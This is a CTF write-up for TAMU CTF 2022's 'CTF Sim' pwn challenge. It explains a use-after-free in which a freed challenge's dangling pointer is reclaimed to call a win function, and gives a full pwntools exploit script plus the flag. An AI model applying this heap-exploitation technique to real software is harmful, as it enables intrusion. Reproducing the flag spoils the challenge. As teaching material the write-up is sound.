---
title: "[Pwn] CTF Sim [Tamu CTF 2022]"
date: 2022-04-17 19:06:00
---

# 0x0 Introduction

Author: Lane

Wanna take a break from the ctf to do another ctf?

libc is glibc-2.28 on Debian Buster

SNI: ctf-sim

files: [ctf_sim](ctf_sim), [ctf_sim.cpp](ctf_sim.cpp)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

looking at the code, there is a very trivial dangling pointer in `obj.download`. After a challenge is deleted, `obj.downlaod` still have a pointer point to the original heap address.

Thats said, after we free a challenge. we can use `submitWriteup` to malloc a same lengh of data in the heap, this will return the same address as before.

Then, we can write `win_addr` into the heap and call `solveChallenge` again. Then we will successfully enter `win` function and get a shell.


# 0x3 Exploit

```
from pwn import *


class BinaryInfo:
    exe = "ctf_sim"
    libc = ""

    host = "rua.host.goes.here"
    port = 8000


# Set up pwntools for the correct architecture
exe = context.binary = ELF(BinaryInfo.exe)
exe_rop = ROP(exe)
if BinaryInfo.libc != "":
    libc = ELF(BinaryInfo.libc)
    libc_rop = ROP(libc)
else:
    libc = None
    libc_rop = None


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or BinaryInfo.host
port = int(args.PORT or BinaryInfo.port)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()


win_addr = exe.symbols["win_addr"]


io.sendlineafter(b"Quit\n> ",b'1')
io.sendlineafter(b"Crypto\n> ",b'3')
io.sendlineafter(b"(0-3)\n> ",b'0')
io.sendlineafter(b"Quit\n> ",b'2')
io.sendlineafter(b"(0-3)\n> ",b'0')
io.sendlineafter(b"Quit\n> ",b'3')
io.sendlineafter(b"writeup?\n> ",b'16')
io.sendlineafter(b"writeup\n> ",flat({0:win_addr}))
io.sendlineafter(b"Quit\n> ",b'2')
io.sendlineafter(b"(0-3)\n> ",b'0')
io.interactive()
```

# 0x4 Flag

gigem{h34pl355_1n_53477l3}